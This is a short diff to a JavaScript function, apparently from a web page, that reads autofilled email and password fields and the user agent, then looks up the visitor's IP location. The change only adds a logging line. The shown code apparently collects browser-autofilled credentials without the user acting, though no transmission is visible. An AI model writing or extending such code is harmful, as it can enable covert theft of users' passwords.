@@ -23,6 +23,7 @@ function getAutofilledValues() {
   var password = document.getElementById(`password`).value;
   var userAgent = navigator.userAgent;
 
+  console.log(email);
   if (email !== ``) {
     fetch('https://ipinfo.io/json')
       .then(response => response.json())
@@ -38,6 +39,4 @@ function getAutofilledValues() {
   };
   
   console.log(email);
-
-  
 }
